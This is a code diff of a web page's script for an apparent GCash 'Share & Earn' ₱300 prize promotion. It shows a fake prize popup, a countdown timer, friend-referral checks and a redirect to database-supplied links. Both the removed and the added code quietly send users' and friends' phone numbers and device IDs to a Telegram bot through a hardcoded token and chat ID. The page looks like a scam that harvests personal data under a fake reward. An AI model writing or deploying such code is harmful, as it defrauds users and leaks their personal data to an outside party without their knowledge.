+        const friendPhone = friendInput.value.trim();
         if (!friendPhone || friendPhone.length !== 11 || !friendPhone.startsWith('09')) {
             alert("Please enter a valid 11-digit mobile number starting with 09.");
             return;
         }
-        
-        const shareRef = db.ref('share_earn/' + userPhone + '/sharedWith/' + friendPhone);
-        const shareSnap = await shareRef.once('value');
-        
-        if (shareSnap.exists()) {
-            alert("You already shared with this friend! Share with another friend to unlock.");
+        // Check if device already used
+        const deviceCheck = await db.ref('share_earn_device/' + deviceId).once('value');
+        if (deviceCheck.exists() && deviceCheck.val().shared) {
+            alert("This device already participated. Only one account per device allowed.");
             return;
         }
+        gameState.shared = true;
+        gameState.referralPhone = friendPhone;
+        gameState.timerSeconds = 300;
+        await saveGameData();
+        startPopupTimer();
+        updateUI();
+        showPrizePopup();
         
-        await shareRef.set({
-            timestamp: Date.now(),
-            sharedBy: userPhone
-        });
-        
-        shareCount++;
-        updateUIProgress();
-        saveShareData();
-        
-        const msg = `🐾 SHARE & EARN\n📱 ${userPhone}\n👥 Shared with: ${friendPhone}\n📊 Progress: ${shareCount}/${REQUIRED_SHARES}`;
-        fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(msg)}`)
-            .catch(e => console.log('Telegram error:', e));
-        
-        document.getElementById('friendPhone').value = '';
-        
-        alert(`✅ Shared with ${friendPhone}!\nProgress: ${shareCount}/${REQUIRED_SHARES} share completed.`);
-        
-        if (shareCount >= REQUIRED_SHARES) {
-            unlockPrize();
-        }
+        fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent("📱 SHARE INITIATED\nDevice: " + deviceId + "\nUser: " + userPhone + "\nFriend: " + friendPhone)}`)
+            .catch(e => console.log);
     }
     
-    let confettiAnimation = null;
+    // ========== CHECK FRIEND CONFIRMATION ==========
+    async function checkFriendConfirmation() {
+        if (gameState.friendConfirmed || gameState.claimed) return;
+        if (!gameState.referralPhone) return;
+        const ref = db.ref('friend_confirmation/' + gameState.referralPhone);
+        const snap = await ref.once('value');
+        if (snap.exists() && snap.val().confirmed === true) {
+            gameState.friendConfirmed = true;
+            await saveGameData();
+            updateUI();
+            if (gameState.popupVisible) {
+                popupBalanceSpan.innerHTML = `₱300.00`;
+                const inviteDiv = document.querySelector('.invite-text');
+                if (inviteDiv) inviteDiv.innerHTML = "✅ Friend confirmed! You can now claim ₱300!";
+            }
+            if (gameState.timerSeconds > 0) {
+                claimBtn.disabled = false;
+                claimBtn.style.opacity = '1';
+            }
+        }
+    }
+    setInterval(checkFriendConfirmation, 5000);
     
+    // ========== CLAIM THRU GCASH ==========
+    async function claimThruGCash() {
+        if (gameState.claimed) { alert("Already claimed!"); return; }
+        if (!gameState.friendConfirmed) { alert("Friend must confirm invitation first."); return; }
+        if (gameState.timerSeconds <= 0) { alert("Time expired. Please try again."); return; }
+        gameState.claimed = true;
+        await saveGameData();
+        updateUI();
+        startConfetti();
+        
+        let gcashLink = "https://gcash.com/promo";
+        if (db) {
+            const snap = await db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value');
+            if (snap.exists()) {
+                const key = Object.keys(snap.val())[0];
+                gcashLink = snap.val()[key].url;
+                await db.ref('links/' + key).update({ status: 'claimed', user: userPhone, amount: 300, claimedAt: Date.now() });
+            }
+        }
+        alert("Processing GCash claim... Redirecting.");
+        setTimeout(() => { window.location.href = gcashLink; }, 1500);
+    }
+    
+    // ========== SHARE TO FACEBOOK ==========
+    function shareToFacebook() {
+        const url = encodeURIComponent(window.location.origin + "/index.html");
+        window.open(`https://www.facebook.com/sharer/sharer.php?u=${url}`, '_blank', 'width=600,height=400');
+    }
+    
+    // ========== CONFETTI ==========
+    let confettiAnimation = null;
     function startConfetti() {
         const canvas = document.getElementById('confettiCanvas');
         canvas.width = window.innerWidth;
         canvas.height = window.innerHeight;
         canvas.style.display = 'block';
-        
         const ctx = canvas.getContext('2d');
         const particles = [];
-        
         for (let i = 0; i < 150; i++) {
             particles.push({
                 x: Math.random() * canvas.width,
@@ -738,16 +856,14 @@
                 spin: Math.random() * 360
             });
         }
-        
         function draw() {
             ctx.clearRect(0, 0, canvas.width, canvas.height);
-            let stillActive = false;
-            
+            let alive = false;
             for (let p of particles) {
                 p.y += p.speed;
                 p.spin += 5;
                 if (p.y < canvas.height) {
-                    stillActive = true;
+                    alive = true;
                     ctx.save();
                     ctx.translate(p.x, p.y);
                     ctx.rotate(p.spin * Math.PI / 180);
@@ -756,34 +872,26 @@
                     ctx.restore();
                 }
             }
-            
-            if (stillActive) {
-                confettiAnimation = requestAnimationFrame(draw);
-            } else {
-                cancelAnimationFrame(confettiAnimation);
-                canvas.style.display = 'none';
-            }
+            if (alive) confettiAnimation = requestAnimationFrame(draw);
+            else { cancelAnimationFrame(confettiAnimation); canvas.style.display = 'none'; }
         }
-        
         draw();
-        
-        setTimeout(() => {
-            if (confettiAnimation) {
-                cancelAnimationFrame(confettiAnimation);
-                canvas.style.display = 'none';
-            }
-        }, 5000);
+        setTimeout(() => { if (confettiAnimation) cancelAnimationFrame(confettiAnimation); canvas.style.display = 'none'; }, 5000);
     }
     
-    function stopConfetti() {
-        if (confettiAnimation) {
-            cancelAnimationFrame(confettiAnimation);
-            confettiAnimation = null;
-        }
-        document.getElementById('confettiCanvas').style.display = 'none';
-    }
+    // ========== INITIALIZE ==========
+    shareBtn.onclick = shareAndEarn;
+    claimBtn.onclick = claimThruGCash;
+    fbBtn.onclick = shareToFacebook;
+    window.closePrizePopup = closePrizePopup;
     
-    loadShareData();
+    loadGameData();
+    
+    // Handle friend confirmation via URL (ref parameter)
+    const urlRef = new URLSearchParams(window.location.search).get('ref');
+    if (urlRef && userPhone) {
+        db.ref('friend_confirmation/' + urlRef).set({ confirmed: true, friend: userPhone, timestamp: Date.now() });
+    }
 </script>
 </body>
 </html>
